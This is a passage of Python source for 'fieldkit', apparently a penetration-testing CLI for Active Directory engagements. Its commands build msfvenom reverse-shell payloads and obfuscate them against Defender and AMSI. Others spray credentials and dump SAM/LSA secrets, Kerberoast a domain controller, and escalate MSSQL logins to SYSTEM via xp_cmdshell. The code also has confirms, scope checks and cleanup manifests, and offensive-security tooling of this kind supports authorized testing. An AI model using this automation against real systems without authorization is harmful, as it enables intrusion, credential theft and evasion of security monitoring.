        out = args.out or os.path.join(_build_dir(),
                                       f"{os.path.splitext(os.path.basename(src))[0]}-obf.exe")
        cfg = {}
        if os.path.exists(_db_path(args)):
            try:
                with _open_store(args) as store:
                    cfg = config_mod.load(store)
            except FieldkitError:
                pass
        res = poc_mod.obfuscate(src, out, cli=args.confuser or cfg.get("confuser_cli"))
        if not res.ok:
            _err(f"obfuscate failed ({res.tool or 'ConfuserEx'}): {res.detail}")
            return 1
        print(f"obfuscated via {res.tool}: {res.path}")
        print("  stage this in place of the stock .exe for the on-disk native rung; "
              "the in-memory rung already evades on-disk via reflection + `amsi_bypass`.")
        return 0
    if not args.format:
        _err("a format is required (exe|dll|msi|so|ps1), --obfuscate <exe>, or --check")
        return 2
    out = args.out or os.path.join(_build_dir(), f"payload.{args.format}")
    if not poc_mod.have(args.format) and not args.source:
        _err(f"{poc_mod.BUILDER.get(args.format, 'the builder')} for {args.format} is not "
             "installed — `fieldkit poc --check`")
        return 2
    cfg = {}
    if os.path.exists(_db_path(args)):  # poc works standalone; use lhost/lport if a db exists
        try:
            with _open_store(args) as store:
                cfg = config_mod.load(store)
        except FieldkitError:
            pass
    lhost = args.lhost or cfg.get("lhost")
    lport = args.lport or cfg.get("lport")
    res = poc_mod.build(args.format, out, arch=args.arch, command=args.command,
                        lhost=lhost, lport=lport, source=args.source)
    if not res.ok:
        _err(f"build failed ({res.tool}): {res.detail}")
        return 1
    kind = "reverse shell" if (lhost and lport) else f"proof ({args.command or 'whoami/id'})"
    print(f"built {res.fmt} via {res.tool}: {res.path}")
    print(f"  payload: {kind}" + (f"  (arch {args.arch})" if args.format in ("exe", "dll") else ""))
    return 0


def cmd_mssql_escalate(args):
    with _open_store(args) as store:
        store.require_engagement()
        host, cred, err = _resolve_target(store, args.host)
        if err:
            _err(err)
            return 2
        allow_cc = "config-change" in (args.allow or [])
        prompt = ("enumerate + escalate MSSQL privileges on "
                  + args.host + (" (may add your login to the sysadmin role — reversible)?"
                                 if allow_cc else
                                 " (read-only enum; add --allow config-change to escalate)?"))
        if not _confirm(prompt, args.yes):
            print("aborted — nothing ran")
            return 1
        rep = mssql_mod.escalate_privs(store, host, cred, allow_config_change=allow_cc,
                                       on_event=lambda m: print(m))
    if rep.aborted:
        _err(rep.aborted)
        return 2

    print()
    nxt = (f"next: `{PROG} enum {args.host}` → "
           f"`{PROG} escalate {args.host} --allow config-change` → SYSTEM (over xp_cmdshell).")
    if rep.status == "xpcmd":
        print("GOT EXEC: xp_cmdshell runs OS commands as the SQL service account (enabled + "
              "verified). Recorded as a finding; your MSSQL access is upgraded to admin, and "
              "disabling xp_cmdshell is on the cleanup manifest.")
        print(nxt)
    elif rep.status == "escalated":
        print(f"ESCALATED: impersonated {rep.via} → added your login to sysadmin → enabled "
              "xp_cmdshell (verified). Recorded as a finding; cleanup (drop the role member, "
              "disable xp_cmdshell) is on the manifest.")
        print(nxt)
    elif rep.status == "already_sysadmin":
        print("you are sysadmin — re-run with `--allow config-change` to enable + confirm "
              f"xp_cmdshell, then `{PROG} enum`/`escalate` run over it.")
    elif rep.status == "gated":
        print(f"impersonatable sysadmin login(s): {', '.join(rep.impersonatable)} — re-run "
              "with `--allow config-change` to grant yourself sysadmin (reversible).")
    elif rep.status == "linked_only":
        print(f"no impersonation path, but RPC-out linked server(s): {', '.join(rep.linked)} "
              "(recorded as observations). Hop with `EXEC ('…') AT [<server>]`.")
    elif rep.status == "failed":
        print("the impersonation grant did not verify as sysadmin — inspect manually.")
    else:
        print("no SQL-layer escalation path found (no impersonatable sysadmin login, no "
              "RPC-out linked servers).")
    return 0


def cmd_lab_test(args):
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        lab_host = args.host or cfg.get("lab_host")
        if not lab_host:
            _err("no lab host — set one with `fieldkit config set lab_host=<ip>` or pass --host")
            return 2
        host, cred, err = _resolve_target(store, lab_host)
        if err:
            _err(err)
            return 2
        if host["os"] and host["os"] != evasion_mod.WINDOWS:
            _err(f"the lab host {lab_host} is not Windows — the Defender harness is Windows-only")
            return 2
        if not _confirm(f"run the Defender lab probes against {lab_host}? (drops the EICAR "
                        "control + benign probes on the lab)", args.yes):
            print("aborted — nothing ran")
            return 1
        report = lab_mod.run_tests(store, host, cred, allow=("read-only", "config-change"),
                                   on_event=lambda m: print(m))

    if report.aborted:
        _err(report.aborted)
        return 2
    greens = report.green
    print(f"\nlab {lab_host} (signature {report.signature or '?'}): "
          f"{len(greens)} green, {len(report.results) - len(greens)} red")
    if report.skipped:
        print(f"skipped (need a staged benign probe): {', '.join(report.skipped)}")
    print(f"\nsee the full matrix: {PROG} posture")
    return 0


def cmd_posture(args):
    now = datetime.now(timezone.utc)
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        lab_host = cfg.get("lab_host")
        statuses = [evasion_mod.resolve(t, store.evasion_result(t.key), now=now)
                    for t in evasion_mod.TECHNIQUES]

    label = {evasion_mod.GREEN: "GREEN", evasion_mod.CAUGHT: "RED  caught",
             evasion_mod.STALE: "RED  stale", evasion_mod.UNTESTED: "RED  untested"}
    print("evasion posture — assume-caught: every path is red until the lab proves it clean\n")
    print(f"  lab host: {lab_host or '(unset — `fieldkit config set lab_host=<ip>`)'}")
    proven = [s for s in statuses if s.usable]
    print(f"  {_plural(len(proven), 'technique')} lab-proven green; "
          "the rest are treated as caught.\n")

    for os_name in (evasion_mod.WINDOWS, evasion_mod.LINUX):
        group = evasion_mod.recommend([s for s in statuses if s.technique.os == os_name])
        if not group:
            continue
        print(f"  {os_name}:")
        for s in group:
            t = s.technique
            amsi = "AMSI" if t.amsi_surface else "no-AMSI"
            print(f"    {label[s.verdict]:<13} {t.title:<34} [{amsi}]  {s.reason}")
        print()

    win = evasion_mod.recommend([s for s in statuses if s.technique.os == evasion_mod.WINDOWS])
    order = ", ".join(s.technique.key for s in win)
    print(f"recommended delivery order (Windows, current knowledge):\n  {order}")
    if not proven:
        print(f"\nnothing is lab-proven — run `{PROG} lab test` against a Defender host to earn a green.")
    return 0


def _domain_credential(store):
    for row in store.credentials():
        if row["domain"] and not row["local_auth"]:
            return row
    return None


def cmd_roast(args):
    with _open_store(args) as store:
        store.require_engagement()
        dcs = [h for h in store.hosts() if h["is_dc"]]
        dc_ip = args.dc or (dcs[0]["ip"] if dcs else None)
        if not dc_ip:
            _err("no DC known — mark one with `add hosts --dc`, or pass --dc <ip>")
            return 2
        dc_host = store.host_by_ip(dc_ip)
        if dc_host is None:
            _err(f"{dc_ip} is not in scope — add it with `fieldkit add hosts`")
            return 2
        cred = _domain_credential(store)
        if cred is None:
            _err("roasting needs a domain credential — add one with `fieldkit add cred`")
            return 2
        kinds = {"both": ("kerberoast", "asrep_roast"), "kerberoast": ("kerberoast",),
                 "asrep": ("asrep_roast",)}[args.kind]
        principal = creds_mod.Credential.from_row(cred).principal
        if not _confirm(f"roast {', '.join(kinds)} against {dc_ip} as {principal}? "
                        "(read-only Kerberos requests)", args.yes):
            print("aborted — nothing ran")
            return 1
        report = kerberos_mod.run_roast(store, dc_host, cred, kinds=kinds,
                                        on_event=lambda m: print(m))
    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\nrecovered {_plural(report.recovered, 'roast hash')} into loot"
          + (" — crack offline, then `fieldkit add cred` to re-spray"
             if report.recovered else ""))
    return 0


def cmd_bloodhound_import(args):
    if not os.path.exists(args.path):
        _err(f"{args.path}: no such file or directory")
        return 2
    with _open_store(args) as store:
        store.require_engagement()
        try:
            counts = bloodhound_mod.import_graph(store, args.path)
        except ValueError as exc:
            _err(str(exc))
            return 2
        paths = bloodhound_mod.owned_paths(store)
    print(f"imported {counts['nodes']} nodes, {counts['edges']} edges "
          f"({counts['high_value']} high-value)")
    if paths:
        print(f"\n{_plural(len(paths), 'owned principal')} reach a high-value target:")
        for p in paths[:10]:
            print(f"  {p['path']}")
        print("\n`fieldkit analyze` ranks these among the next moves.")
    else:
        print("no owned principal reaches a high-value target yet — "
              "own more credentials (spray/roast) and re-check with `fieldkit analyze`.")
    return 0


def cmd_delegation(args):
    with _open_store(args) as store:
        store.require_engagement()
        dcs = [h for h in store.hosts() if h["is_dc"]]
        dc_ip = args.dc or (dcs[0]["ip"] if dcs else None)
        if not dc_ip:
            _err("no DC known — mark one with `add hosts --dc`, or pass --dc <ip>")
            return 2
        dc_host = store.host_by_ip(dc_ip)
        if dc_host is None:
            _err(f"{dc_ip} is not in scope — add it with `fieldkit add hosts`")
            return 2
        cred = _domain_credential(store)
        if cred is None:
            _err("finding delegation needs a domain credential — add one with `add cred`")
            return 2
        principal = creds_mod.Credential.from_row(cred).principal
        if not _confirm(f"enumerate Kerberos delegation on {dc_ip} as {principal}? "
                        "(nxc --find-delegation, read-only)", args.yes):
            print("aborted — nothing ran")
            return 1
        report = delegation_mod.run_find(store, dc_host, cred, on_event=lambda m: print(m))
    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\nfound {_plural(report.found, 'delegation')} — "
          "`fieldkit analyze` ranks them, `fieldkit report` writes them up")
    return 0


def cmd_adcs_find(args):
    with _open_store(args) as store:
        store.require_engagement()
        dcs = [h for h in store.hosts() if h["is_dc"]]
        dc_ip = args.dc or (dcs[0]["ip"] if dcs else None)
        if not dc_ip:
            _err("no DC/CA known — mark one with `add hosts --dc`, or pass --dc <ip>")
            return 2
        dc_host = store.host_by_ip(dc_ip)
        if dc_host is None:
            _err(f"{dc_ip} is not in scope — add it with `fieldkit add hosts`")
            return 2
        cred = _domain_credential(store)
        if cred is None:
            _err("certipy needs a domain credential — add one with `fieldkit add cred`")
            return 2
        principal = creds_mod.Credential.from_row(cred).principal
        if not _confirm(f"enumerate vulnerable certificate templates on {dc_ip} as "
                        f"{principal}? (certipy find, read-only)", args.yes):
            print("aborted — nothing ran")
            return 1
        report = adcs_mod.run_find(store, dc_host, cred, on_event=lambda m: print(m))
    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\nfound {_plural(report.found, 'vulnerable template')} — "
          "`fieldkit analyze` ranks them, `fieldkit report` writes them up")
    return 0


def cmd_report(args):
    # Observations are in the report by default now; --proven-only drops them. (--all is a
    # retired no-op alias — it used to be the way to include observations.)
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        engagement, findings = report_mod.build(store, cfg, proven_only=args.proven_only)

    proven = [f for f in findings if f.get("proven", True)]
    errors, warns = report_mod.check(findings)
    if args.check:
        for tag, m in errors:
            print(f"  ERROR  [{tag}] {m}")
        for tag, m in warns:
            print(f"  warn   [{tag}] {m}")
        if errors:
            print(f"CHECK FAILED: {len(errors)} error(s), {len(warns)} warning(s).")
            return 2
        print(f"CHECK OK: {_plural(len(proven), 'proven finding')}, "
              f"{len(warns)} warning(s) — every proven finding carries its captured proof.")
        return 0

    if args.cleanup:
        # only proven findings made changes to a target — observations weren't exploited.
        path = f"{args.out}.cleanup.md"
        with open(path, "w") as fh:
            fh.write(report_mod.cleanup_manifest(engagement, proven))
        print(f"wrote {path}  (INTERNAL cleanup manifest — do not send to the client)")
        return 0

    if errors and not args.force:
        for tag, m in errors:
            print(f"  ERROR  [{tag}] {m}")
        _err(f"refusing to render: {_plural(len(errors), 'anti-fabrication error')} "
             "(a proven finding without captured proof). Fix them, or pass --force.")
        return 2

    formats = [x.strip() for x in args.formats.split(",") if x.strip()]
    md = report_mod.render_markdown(engagement, findings)
    md_path = f"{args.out}.md"
    with open(md_path, "w") as fh:
        fh.write(md)
    obs = len(findings) - len(proven)
    tally = _plural(len(proven), "finding") + (f" + {_plural(obs, 'observation')}" if obs else "")
    print(f"wrote {md_path}  ({tally})")
    for line in report_mod.export(md_path, args.out, formats):
        print(line)
    if not proven:
        print("note: no proven findings yet — run `fieldkit run`/`escalate` to prove vectors "
              "(the report currently holds only observations)."
              if findings else
              "note: nothing to report yet — spray/enum/escalate first.")
    return 0


def cmd_export_recce(args):
    import json
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        engagement, findings = report_mod.build(store, cfg, proven_only=not args.all)
    if not findings:
        _err("no proven findings to export — run `fieldkit run` to prove vectors first "
             "(or --all to include unproven)")
        return 2
    payload = bridge_mod.export_payload(engagement, findings)
    dest = args.out or "recce_findings.json"
    with open(dest, "w") as fh:
        json.dump(payload, fh, indent=2)
    print(f"wrote {dest}  ({_plural(len(findings), 'finding')}, KB-enriched for recce)")
    print(f"  fold into the recce workbook + report:  recce fieldkit-import {dest} -o <engagement>")
    return 0


def cmd_arsenal_list(args):
    st = arsenal_mod.staged()
    root = arsenal_mod.arsenal_dir()
    if not st:
        print(f"nothing staged in {root} — run `sh exploits/fetch.sh` on a connected box.")
        return 0
    total = sum(len(v) for v in st.values())
    print(f"staged arsenal ({total} artifacts in {root}):\n")
    for cat, names in st.items():
        print(f"  {cat} ({len(names)})")
        print("    " + ", ".join(names))
    return 0


def cmd_arsenal_find(args):
    p = arsenal_mod.find(args.name)
    if p:
        print(p)
        return 0
    _err(f"{args.name!r} is not staged (checked {arsenal_mod.arsenal_dir()})")
    return 1


def _resolutions():
    out = []
    for key, need in sorted(arsenal_mod.PRIVESC_NEEDS.items()):
        out.append(("privesc", arsenal_mod.resolve(key, need)))
    for key, need in sorted(arsenal_mod.EVASION_NEEDS.items()):
        out.append(("evasion", arsenal_mod.resolve(key, need)))
    return out


def cmd_arsenal_check(args):
    res = _resolutions()
    marks = {arsenal_mod.BUILTIN: "native", arsenal_mod.BUILD: "build",
             arsenal_mod.STAGED: "staged", arsenal_mod.SUPPLIED: "supply"}
    gaps = [(g, r) for g, r in res if not r.ready]
    print("arsenal readiness — what each route needs to fire:\n")
    if args.all:
        for group, r in res:
            flag = "OK " if r.ready else "!! "
            print(f"  {flag}[{marks[r.need.kind]:<6}] {group}:{r.key:<24} {r.detail}")
        print()
    print(f"{_plural(len(gaps), 'gap')} — routes that need an artifact you must stage/supply:")
    if not gaps:
        print("  (none — every mapped route is native, buildable, or already staged)")
    for _, r in gaps:
        print(f"  !! {r.key:<24} {r.need.hint}")
        print(f"       {r.detail}")
    print("\n(build-kind routes are produced by `fieldkit poc`; run with --all for the full map)")
    return 0


def cmd_status(args):
    with _open_store(args) as store:
        row = store.require_engagement()
        cfg = config_mod.load(store)
        counts = store.counts()

        print(f"engagement:  {row['name']}   created {row['created']}")
        print(f"database:    {store.path}")
        summary = "  ".join(
            f"{k}={cfg.get(k)}" for k in config_mod.HEADLINE_KEYS if cfg.get(k))
        overrides = cfg.overrides()
        print(f"config:      {summary or '(unset — run `fieldkit config set lhost=…`)'}"
              + (f"   (+{_plural(len(overrides), 'subnet override')})" if overrides else ""))
        print()

        os_mix = "  ".join(f"{r['os'] or 'unfingerprinted'} {r['n']}"
                           for r in store.host_os_breakdown())
        cred_mix = "  ".join(f"{r['secret_type']} {r['n']}"
                             for r in store.credential_type_breakdown())
        print(f"hosts        {counts['hosts']:>5}   {os_mix}")
        print(f"services     {counts['services']:>5}")
        print(f"credentials  {counts['credentials']:>5}   {cred_mix}")
        print(f"access       {counts['access']:>5}   "
              f"{counts['admin_access']} admin on {_plural(counts['admin_hosts'], 'host')}")
        print(f"findings     {counts['findings']:>5}   {counts['proven_findings']} proven")
        print(f"loot         {counts['loot']:>5}")

        if args.hosts:
            print("\nhosts:")
            for host in store.hosts():
                print(f"  {host['ip']:<39} {host['hostname'] or '':<20} "
                      f"{host['os'] or '':<8} {host['subnet'] or ''}"
                      + ("  DC" if host["is_dc"] else ""))
        if args.creds:
            print("\ncredentials:")
            for row in store.credentials():
                cred = creds_mod.Credential.from_row(row)
                print(f"  {cred.principal:<32} {cred.secret_type:<9} source={row['source']}")

        if not counts["hosts"]:
            print(f"\nnext: {PROG} add hosts scope.txt")
        elif not counts["credentials"]:
            print(f"\nnext: {PROG} add cred 'CORP/jdoe:Winter2025!'")
    return 0


# -------------------------------------------------------------------------- parser

def build_parser():
    parser = argparse.ArgumentParser(
        prog=PROG,
        description="Stateful internal-AD execution engine. Authorized engagements only.")
    parser.add_argument("--version", action="version", version=f"{PROG} {__version__}")
    parser.add_argument("--db", metavar="PATH",
                        help=f"engagement database (default: ${DB_ENV_VAR} or ./engagement.db)")
    sub = parser.add_subparsers(dest="command", metavar="<command>")

    p_init = sub.add_parser("init", help="create ./engagement.db")
    p_init.add_argument("name", nargs="?", help="engagement name (default: directory name)")
    p_init.set_defaults(func=cmd_init)

    p_config = sub.add_parser("config", help="engagement config (lhost/lport/domain/…)")
    config_sub = p_config.add_subparsers(dest="config_command", metavar="<action>")

    c_show = config_sub.add_parser("show", help="print every key")
    c_show.set_defaults(func=cmd_config_show)

    c_get = config_sub.add_parser("get", help="print one key")
    c_get.add_argument("key")
    c_get.set_defaults(func=cmd_config_get)

    c_set = config_sub.add_parser("set", help="set keys, e.g. lhost=10.10.14.7 lport=443")
    c_set.add_argument("assignments", nargs="+", metavar="key=value")
    c_set.add_argument("--subnet", metavar="CIDR",
                       help="scope this lhost to one segment (per-subnet override)")
    c_set.set_defaults(func=cmd_config_set)

    c_unset = config_sub.add_parser("unset", help="remove a key or a subnet override")
    c_unset.add_argument("key", nargs="?")
    c_unset.add_argument("--subnet", metavar="CIDR")
    c_unset.set_defaults(func=cmd_config_unset)
    p_config.set_defaults(func=cmd_config_show)  # bare `config` shows everything

    p_add = sub.add_parser("add", help="add credentials or hosts")
    add_sub = p_add.add_subparsers(dest="add_command", metavar="<what>")

    a_cred = add_sub.add_parser(
        "cred", help="add a credential in whatever form you have it",
        description="Accepts DOMAIN\\user:pass, user@corp.local:pass, corp/user:pass, "
                    "user:LM:NT, :NT, a secretsdump line, or a ccache/key path.")
    a_cred.add_argument("spec", nargs="?", help="the credential as you have it")
    a_cred.add_argument("--user", help="username, when the spec has none")
    a_cred.add_argument("--domain", help="AD domain (overrides the spec)")
    a_cred.add_argument("--password", help="password, when the spec has none")
    a_cred.add_argument("--hash", help="NT hash (or LM:NT)")
    a_cred.add_argument("--aes", help="Kerberos AES128/256 key (hex)")
    a_cred.add_argument("--ccache", help="path to a Kerberos ccache")
    a_cred.add_argument("--ssh-key", dest="ssh_key", help="path to an SSH private key")
    a_cred.add_argument("--local", action="store_true",
                        help="local account (tools get --local-auth, not -d)")
    a_cred.add_argument("--source", default="manual",
                        help="where it came from: manual/spray/sam/lsa/gpp/ntds/… (default: manual)")
    a_cred.add_argument("--from-file", metavar="FILE", help="one credential per line")
    a_cred.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    a_cred.set_defaults(func=cmd_add_cred)

    a_hosts = add_sub.add_parser("hosts", help="add scope: IPs, CIDRs, or a scope file")
    a_hosts.add_argument("targets", nargs="*", help="IP, CIDR, or a path to a scope file")
    a_hosts.add_argument("--file", help="scope file (one entry per line)")
    a_hosts.add_argument("--os", choices=["windows", "linux", "other"], help="record the OS")
    a_hosts.add_argument("--dc", action="store_true", help="mark these as domain controllers")
    a_hosts.add_argument("--subnet", help="override the derived subnet label")
    a_hosts.add_argument("--max-expand", type=int, default=scope_mod.DEFAULT_MAX_EXPAND,
                         help="max hosts one CIDR may expand to (default: %(default)s)")
    a_hosts.set_defaults(func=cmd_add_hosts)
    p_add.set_defaults(func=lambda a: _missing(p_add))

    p_ingest = sub.add_parser("ingest", help="fold captured tool output into state")
    ingest_sub = p_ingest.add_subparsers(dest="ingest_command", metavar="<tool>")
    i_nxc = ingest_sub.add_parser(
        "nxc", help="record a saved netexec capture (valid creds + (Pwn3d!) access)",
        description="Reads nxc output from a file or stdin, records every [+] "
                    "credential and (Pwn3d!) admin result, and enriches scope from "
                    "the [*] banners. The offline twin of `fieldkit spray`.")
    i_nxc.add_argument("file", nargs="?", help="capture file (default: stdin)")
    i_nxc.add_argument("--source", default="spray",
                       help="where these results came from (default: spray)")
    i_nxc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    i_nxc.set_defaults(func=cmd_ingest_nxc)
    p_ingest.set_defaults(func=lambda a: _missing(p_ingest))

    p_spray = sub.add_parser(
        "spray", help="validate stored creds across scope and run the credential loop",
        description="Sprays every stored credential across the scope on one protocol, "
                    "records who is valid and who is admin ((Pwn3d!)), dumps SAM+LSA on "
                    "owned hosts, promotes recovered secrets to credentials, and repeats "
                    "until dry. Reuses each account's own proven secret, so it cannot "
                    "lock a domain account.")
    p_spray.add_argument("proto", nargs="?", default="smb",
                         help=f"protocol: {', '.join(spray_mod.PROTOCOLS)} (default: smb)")
    p_spray.add_argument("--subnet", metavar="CIDR", help="limit to one segment")
    p_spray.add_argument("--dc", metavar="IP", help="read the lockout policy from this DC")
    p_spray.add_argument("--no-loot", action="store_true",
                         help="do not dump SAM/LSA on owned hosts")
    p_spray.add_argument("--no-policy", action="store_true",
                         help="skip reading the domain password policy first")
    p_spray.add_argument("--timeout", type=int, default=600,
                         help="per-command timeout in seconds (default: %(default)s)")
    p_spray.add_argument("-y", "--yes", action="store_true",
                         help="run without the confirm-back")
    p_spray.set_defaults(func=cmd_spray)

    p_analyze = sub.add_parser(
        "analyze", help="rank the next moves from what the loop has proved",
        description="Reads state and ranks privesc/lateral opportunities by "
                    "exploitability x safety x detection. Read-only — it names the "
                    "next move, it does not run it.")
    p_analyze.add_argument("--proof", action="store_true",
                           help="show each opportunity's safe-proof (report evidence)")
    p_analyze.set_defaults(func=cmd_analyze)

    p_enum = sub.add_parser(
        "enum", help="enumerate a host you have a foothold on (read-only, captured)",
        description="Runs the OS-appropriate privesc enumeration on a host through the "
                    "read-only executor, captures every check as evidence, and prints "
                    "the signals that feed `analyze`.")
    p_enum.add_argument("host", metavar="IP", help="a host you already have access on")
    p_enum.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_enum.set_defaults(func=cmd_enum)

    p_run = sub.add_parser(
        "run", help="fire a privesc vector on a host, captured, through the safety gate",
        description="Runs one vector from `analyze` on a host. read-only vectors run "
                    "after a confirm; config-change/crash-risk vectors need an explicit "
                    "--allow. Output, the finding and any cleanup artifact are recorded.")
    p_run.add_argument("host", metavar="IP", help="the host to escalate on")
    p_run.add_argument("vector", help="the vector key from `analyze` (e.g. sudo:find)")
    p_run.add_argument("--allow", action="append",
                       choices=["config-change", "crash-risk"], metavar="LEVEL",
                       help="permit a riskier vector (repeatable)")
    p_run.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_run.set_defaults(func=cmd_run)

    p_esc = sub.add_parser(
        "escalate", help="walk the ranked vectors automatically, stopping at first proof",
        description="The orchestrator: fires the best-ranked vector on a host, classifies "
                    "the result, and follows the fallback axis — advance to the next "
                    "vector, retry a timeout, stop on proof, or halt on anything it does "
                    "not recognise. Vectors above --allow are skipped, never fired. Every "
                    "step is captured and the winning vector is recorded as a finding.")
    p_esc.add_argument("host", metavar="IP", nargs="?", help="the host to escalate on")
    p_esc.add_argument("--allow", action="append",
                       choices=["config-change", "crash-risk"], metavar="LEVEL",
                       help="permit riskier vectors in the loop (repeatable)")
    p_esc.add_argument("--max", type=int, metavar="N",
                       help=f"cap vectors fired (default {escalate_mod.DEFAULT_BUDGET})")
    p_esc.add_argument("--no-stage", action="store_true",
                       help="don't auto-stage/build a missing artifact on a miss")
    p_esc.add_argument("--dry-run", action="store_true",
                       help="print the ranked plan and exit without firing")
    p_esc.add_argument("--rules", action="store_true",
                       help="print the axis→action policy table and exit")
    p_esc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_esc.set_defaults(func=cmd_escalate)

    p_poc = sub.add_parser(
        "poc", help="build a payload artifact (msi/exe/dll/so/ps1) by driving the toolchain",
        description="Drives the operator's builders (msfvenom/wixl/gcc/mingw) to produce "
                    "an artifact a vector needs. Orchestration only — the bytes come from "
                    "msfvenom or your --source; fieldkit templates benign scaffolding and "
                    "builds a whoami/id proof by default (--lhost/--lport for a revshell). "
                    "The escalate loop calls this automatically on a build-kind miss.")
    p_poc.add_argument("format", nargs="?", choices=sorted(poc_mod.RECIPES),
                       help="artifact format to build")
    p_poc.add_argument("-o", "--out", metavar="PATH", help="output path (default: ~/.fieldkit/build)")
    p_poc.add_argument("--arch", choices=["x64", "x86"], default="x64",
                       help="target arch for exe/dll (default x64)")
    p_poc.add_argument("--command", metavar="CMD",
                       help="command the artifact runs (default: a whoami/id proof)")
    p_poc.add_argument("--lhost", help="reverse-shell LHOST (msfvenom payload instead of a proof)")
    p_poc.add_argument("--lport", help="reverse-shell LPORT")
    p_poc.add_argument("--source", metavar="FILE", help="compile this .c with mingw (exe/dll)")
    p_poc.add_argument("--obfuscate", metavar="EXE",
                       help="obfuscate a compiled .NET assembly with ConfuserEx (path or arsenal name)")
    p_poc.add_argument("--confuser", metavar="PATH",
                       help="path to the ConfuserEx CLI (else config confuser_cli / PATH)")
    p_poc.add_argument("--check", action="store_true", help="report which builders are installed")
    p_poc.set_defaults(func=cmd_poc)

    p_preflight = sub.add_parser(
        "preflight", help="check which tools fieldkit drives are installed on PATH",
        description="Lists the external tools fieldkit drives (netexec + impacket are the "
                    "spine; certipy/evil-winrm/msfvenom/wixl/gcc/mingw/pandoc are "
                    "per-feature) and whether each is on PATH. Exits non-zero if a required "
                    "tool is missing.")
    p_preflight.set_defaults(func=cmd_preflight)

    p_prep = sub.add_parser(
        "prep", help="build a manual route's artifact + print where to place it and the steps",
        description="Proactive provision for routes the loop can't one-shot (overwrite a "
                    "running service binary, plant a hijack DLL): fieldkit builds the "
                    "artifact and prints the placement path + ordered operator steps. "
                    "--stage also uploads it to the target's stage dir.")
    p_prep.add_argument("host", metavar="IP", help="the host the vector is on")
    p_prep.add_argument("vector", help="the manual vector key (e.g. writablesvc:AppMgmt)")
    p_prep.add_argument("--stage", action="store_true",
                        help="also upload the built artifact to the target (config-change)")
    p_prep.add_argument("-y", "--yes", action="store_true", help="skip the confirm when staging")
    p_prep.set_defaults(func=cmd_prep)

    p_lab = sub.add_parser(
        "lab", help="prove evasion techniques against a Defender lab host")
    lab_sub = p_lab.add_subparsers(dest="lab_command", metavar="<action>")
    l_test = lab_sub.add_parser(
        "test", help="run the benign probes and record Defender's verdict",
        description="Confirms the lab's Defender is live (EICAR control), then runs a "
                    "benign probe per technique and records green/red from Defender's "
                    "own verdict. Refuses to report greens from an unprotected lab.")
    l_test.add_argument("--host", metavar="IP", help="lab host (default: config lab_host)")
    l_test.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    l_test.set_defaults(func=cmd_lab_test)
    p_lab.set_defaults(func=lambda a: _missing(p_lab))

    p_posture = sub.add_parser(
        "posture", help="the evasion green/red matrix + recommended delivery",
        description="Shows every technique's status under assume-caught (red until a "
                    "fresh lab result proves it clean) and the recommended delivery order.")
    p_posture.set_defaults(func=cmd_posture)

    p_roast = sub.add_parser(
        "roast", help="Kerberoast / AS-REP roast a DC into crackable loot",
        description="Drives nxc's Kerberos roasting against a DC with a domain "
                    "credential, stores the $krb5tgs$/$krb5asrep$ hashes as loot, and "
                    "feeds the loop — crack offline, then `add cred` the result.")
    p_roast.add_argument("--dc", metavar="IP", help="DC to roast (default: a host marked --dc)")
    p_roast.add_argument("--kind", choices=["both", "kerberoast", "asrep"], default="both",
                         help="which roast (default: both)")
    p_roast.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_roast.set_defaults(func=cmd_roast)

    p_bh = sub.add_parser("bloodhound", help="ingest SharpHound data + find owned→DA paths")
    bh_sub = p_bh.add_subparsers(dest="bloodhound_command", metavar="<action>")
    b_import = bh_sub.add_parser(
        "import", help="load SharpHound JSON (zip/dir) and path-find from owned creds",
        description="Stores the AD control graph (MemberOf/AdminTo/dangerous ACEs) and "
                    "reports which owned principals reach a high-value target.")
    b_import.add_argument("path", help="SharpHound .zip, a directory of JSON, or a .json")
    b_import.set_defaults(func=cmd_bloodhound_import)
    p_bh.set_defaults(func=lambda a: _missing(p_bh))

    p_deleg = sub.add_parser(
        "delegation", help="find Kerberos delegation (unconstrained/constrained/RBCD)",
        description="Drives nxc --find-delegation with a domain credential and records "
                    "each delegated account as a finding for analyze/report.")
    p_deleg.add_argument("--dc", metavar="IP", help="DC to query (default: a host marked --dc)")
    p_deleg.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_deleg.set_defaults(func=cmd_delegation)

    p_adcs = sub.add_parser("adcs", help="AD Certificate Services (certipy) enumeration")
    adcs_sub = p_adcs.add_subparsers(dest="adcs_command", metavar="<action>")
    a_find = adcs_sub.add_parser(
        "find", help="enumerate vulnerable certificate templates (ESC1-16)",
        description="Drives `certipy find -vulnerable` with a domain credential and "
                    "records each ESC weakness as a finding for analyze/report.")
    a_find.add_argument("--dc", metavar="IP", help="DC/CA host (default: a host marked --dc)")
    a_find.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    a_find.set_defaults(func=cmd_adcs_find)
    p_adcs.set_defaults(func=lambda a: _missing(p_adcs))

    p_mssql = sub.add_parser(
        "mssql", help="MSSQL privilege escalation (low-priv login → sysadmin → SYSTEM)")
    mssql_sub = p_mssql.add_subparsers(dest="mssql_command", metavar="<action>")
    m_esc = mssql_sub.add_parser(
        "escalate", help="try EXECUTE AS impersonation / linked-server paths to sysadmin",
        description="From a non-sysadmin MSSQL login, enumerates the SQL-layer escalation "
                    "surface (impersonatable sysadmin logins, RPC-out linked servers). With "
                    "--allow config-change it impersonates a sysadmin login and adds your "
                    "login to the sysadmin role (reversible), so `enum`/`escalate` then run "
                    "over xp_cmdshell → SYSTEM. Read-only without --allow.")
    m_esc.add_argument("host", metavar="IP", help="the MSSQL host")
    m_esc.add_argument("--allow", action="append", choices=["config-change"], metavar="LEVEL",
                       help="permit the role grant (config-change) to actually escalate")
    m_esc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    m_esc.set_defaults(func=cmd_mssql_escalate)
